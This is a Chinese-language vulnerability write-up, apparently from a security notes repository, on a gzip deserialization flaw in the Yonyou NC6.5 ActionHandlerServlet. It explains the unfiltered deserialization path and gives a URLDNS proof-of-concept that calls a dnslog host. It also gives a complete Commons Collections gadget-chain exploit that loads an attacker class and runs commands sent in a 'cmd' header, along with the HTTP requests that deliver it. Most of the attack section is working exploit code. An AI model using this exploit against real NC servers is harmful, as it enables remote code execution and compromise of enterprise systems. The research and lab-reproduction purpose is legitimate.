# ActionHandlerServlet_Gzip 反序列化

# 0x01 路径

```bash
# URL
/servlet/~aert/com.ufida.zior.console.ActionHandlerServlet

# 物理路径
NC65_Server_home/modules/aert/lib/pubaert_commonLevel-1.jar!/com/ufida/zior/console/ActionHandlerServlet.class
```

# 0x02 漏洞分析
省去在 [用友NC6.5_环境搭建及路由分析](https://github.com/reidmu/sec-note/blob/main/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BNC65/%E7%94%A8%E5%8F%8BNC6.5_%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90.md#0x03-%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90) 中提到的路由解析部分，

进入到 `ActionHandlerServlet.class` 后，不管是 `doPost` 还是 `doGet` 方法，都会调用到 `process` 方法：

![image](https://user-images.githubusercontent.com/84888757/227792401-7afb06ce-1a36-4ca3-a075-d65443aa9541.png)


在 `process` 方法中，对收到的数据先进行 `gzip` 解压然后反序列化，不存在过滤操作，故存在反序列化漏洞。

![image](https://user-images.githubusercontent.com/84888757/227792448-3afa39ac-d851-4e55-8c8d-d45b5170e80c.png)

# 0x03 漏洞验证
使用 `URLDNS` 验证。

生成序列化数据 `1.ser` ，并且 `gzip` 压缩，输出文件 `1.ser.gz`

📒 `ActionHandlerServletGzipPoc.java`
```java
package org.vulhub.nc65;

import java.io.FileOutputStream;
import java.util.zip.GZIPOutputStream;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;


public class ActionHandlerServletGzipPoc {
    public static void main(String[] args) throws Exception {
        HashMap hashMap = new HashMap();
        URL url = new URL("http://123.3pi22q.dnslog.cn");
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, 0);
        hashMap.put(url, "111");
        f.set(url, -1);
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("1.ser"));
        oos.writeObject(hashMap);
        oos.close();

        FileInputStream inputFromFile = new FileInputStream("1.ser");
        byte[] bs = new byte[inputFromFile.available()];
        inputFromFile.read(bs);
        GZIPOutputStream gzip = new GZIPOutputStream(new FileOutputStream("1.ser.gz"));
        gzip.write(bs);
        gzip.close();
    }
}
```

burp -> Paste from file -> 粘贴 `1.ser.gz` 作为 Post data

```bash
POST /servlet/~aert/com.ufida.zior.console.ActionHandlerServlet HTTP/1.1
Host: 192.168.50.13:8888
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.3820.170 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 249

Post data
```

![image](https://user-images.githubusercontent.com/84888757/227792533-f3510645-4ccb-4fdc-87e6-674332dcca05.png)

<div align=center><img src="https://user-images.githubusercontent.com/84888757/227792538-2dd07e82-1f89-4bd1-ad74-679868edd6d6.png" width="700" height="420" /></div>

# 0x04 漏洞利用

写个回显 `payload` 如下：

📒 `ActionHandlerServletGzipExp.java`
```java
package org.vulhub.nc65;

import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.mozilla.javascript.DefiningClassLoader;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.zip.GZIPOutputStream;

import static org.vulhub.nc65.ClassLoaderMain.getBytesByFile;

public class ActionHandlerServletGzipExp {
    public static void main(String[] args) throws Exception{

        byte[] bs = getBytesByFile("/Users/devil/Codes/java/vulhub/src/main/java/org/vulhub/nc65/dfs.class");

        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
//        DefiningClassLoader

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(DefiningClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("defineClass",
                        new Class[]{String.class, byte[].class}, new Object[]{"org.vulhub.nc65.dfs", bs}),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{null}}),
                new ConstantTransformer(1),
        };
        //先传入一个人畜无害的fakeTransformers对象，避免本地调试时出发命令执行
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        // 创建一个map，不用添加Entry
        Map innerMap = new HashMap();

        // 调用LazyMap.decorate实例化LazyMap
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");


        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");

        // ==================
        //将真正的transformers数组设置进来
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        // 序列化数据并写入文件
        serialize(expMap);
        // 从文件读取数据进行反序列化
//        unserialize("ser.bin");

    }

    public static void serialize(Object obj) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("./ActionHandlerSer.bin");
        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
        outputStream.writeObject(obj);
        outputStream.close();
        fileOutputStream.close();

        FileInputStream inputFromFile = new FileInputStream("./ActionHandlerSer.bin");
        byte[] bs = new byte[inputFromFile.available()];
        inputFromFile.read(bs);
        GZIPOutputStream gzip = new GZIPOutputStream(new FileOutputStream("./ActionHandlerSer.bin.gz"));
        gzip.write(bs);
        gzip.close();
//        System.out.println();
    }

    public static void unserialize(String args) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(args);
        ObjectInputStream ois = new ObjectInputStream(fileInputStream);

//        ois.readObject();
        System.out.println( ois.readObject());
    }
}

```

burp -> Paste from file -> 粘贴 `ActionHandlerSer.bin.gz` 作为 Post data

```
POST /servlet/~aert/com.ufida.zior.console.ActionHandlerServlet HTTP/1.1
Host: 192.168.50.13:8888
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.3820.170 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
cmd: whoami
Content-Length: 2327

Post data
```

![image](https://user-images.githubusercontent.com/84888757/227792646-2eb5ef9a-0d25-41a4-9c8a-95420026a63d.png)

# 0x05 参考链接
- https://cn-sec.com/archives/786526.html
- [用友NC65反序列化回显利用](https://github.com/reidmu/sec-note/blob/main/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BNC65/%E7%94%A8%E5%8F%8BNC65%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8.md)
